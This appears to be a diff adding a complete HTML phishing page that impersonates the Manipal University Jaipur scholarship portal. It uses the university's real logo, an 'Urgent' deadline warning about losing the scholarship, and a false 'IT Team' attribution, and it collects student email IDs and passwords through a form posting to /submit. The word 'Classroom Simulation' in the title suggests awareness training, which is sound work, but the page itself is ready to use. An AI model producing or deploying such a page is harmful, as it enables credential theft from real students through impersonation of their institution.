@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Scholarship Portal | Classroom Simulation</title>
+  <style>
+    :root { --orange: #f76522; --ink: #152943; --muted: #647892; --line: #dce4ed; --bg: #f5f7fa; }
+    * { box-sizing: border-box; }
+    body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--ink); font-family: "Segoe UI", Arial, sans-serif; }
+    header { height: 82px; background: #fff; border-bottom: 3px solid var(--orange); display: flex; align-items: center; }
+    .nav { width: min(1280px, calc(100% - 48px)); margin: auto; display: flex; align-items: center; justify-content: space-between; }
+    .brand { display: flex; align-items: center; gap: 18px; }
+    .logo { width: 235px; height: 50px; object-fit: contain; object-position: left center; }
+    .university { font-family: Georgia, serif; font-size: 18px; line-height: 1.05; color: #333; }
+    .portal { border-left: 1px solid var(--line); padding-left: 18px; color: #60738f; font-size: 16px; font-weight: 700; letter-spacing: .02em; }
+    nav { display: flex; gap: 48px; color: #6a7b94; font-weight: 600; }
+    main { min-height: calc(100vh - 82px); display: grid; place-items: center; padding: 68px 20px; }
+    .panel { width: min(474px, 100%); background: #fff; border-top: 5px solid var(--orange); border-radius: 16px; padding: 54px 42px 42px; box-shadow: 0 12px 26px rgba(26, 47, 73, .13); }
+    h1 { margin: 0; text-align: center; color: var(--orange); font-size: 30px; letter-spacing: -.03em; }
+    .intro { margin: 8px 0 38px; text-align: center; color: var(--muted); font-size: 16px; }
+    .notice { border-left: 3px solid var(--orange); background: #fff7f2; color: #7d3a1f; padding: 11px 13px; margin-bottom: 29px; font-size: 13px; line-height: 1.4; }
+    label { display: block; margin: 0 0 10px; color: #172d4b; font-size: 15px; font-weight: 700; }
+    .field { margin-bottom: 25px; }
+    input { width: 100%; height: 47px; border: 1px solid var(--line); border-radius: 7px; padding: 0 16px; color: var(--ink); font: inherit; outline: none; }
+    input:focus { border-color: var(--orange); box-shadow: 0 0 0 3px rgba(247, 101, 34, .14); }
+    button { width: 100%; height: 47px; margin-top: 4px; border: 0; border-radius: 7px; background: var(--orange); color: #fff; font: inherit; font-weight: 700; cursor: pointer; }
+    button:hover { background: #df5518; }
+    .footnote { margin: 25px 0 0; text-align: center; color: #8190a5; font-size: 12px; }
+    @media (max-width: 620px) { header { height: auto; padding: 16px 0; } .nav { width: calc(100% - 32px); } .logo { width: 168px; height: 42px; } .portal { display: none; } nav { gap: 14px; font-size: 13px; } main { padding: 32px 16px; } .panel { padding: 38px 24px 30px; } }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="nav">
+      <div class="brand">
+        <img class="logo" src="https://jaipur.manipal.edu/img/manipal-university-jaipur-logo-01.svg" alt="Manipal University Jaipur">
+        <div class="portal">SCHOLARSHIP PORTAL</div>
+      </div>
+      <nav aria-label="Portal navigation"><span>Student Portal</span><span>Admin Panel</span></nav>
+    </div>
+  </header>
+  <main>
+    <section class="panel" aria-labelledby="title">
+      <h1 id="title">Student Login</h1>
+      <p class="intro">Access your MUJ Scholarship application</p>
+      <div class="notice"><strong>Urgent:</strong> Please update your profile by 26th October 2026, 11:00 PM, or you may lose your scholarship.</div>
+      <form method="post" action="/submit">
+        <div class="field">
+          <label for="student-id">Student mail Id</label>
+          <input id="student-id" name="student_id" inputmode="numeric" autocomplete="off" placeholder="e.g. name.26000001@muj.manipal.edu" required>
+        </div>
+        <div class="field">
+          <label for="P">Password</label>
+          <input id="P" name="P" type="password" autocomplete="off" placeholder="Enter your password" required>
+        </div>
+        <button type="submit">Verify &amp; Login</button>
+      </form>
+      <p class="footnote">By Manipal University Jaipur IT Team</p>
+    </section>
+  </main>
+</body>
+</html>
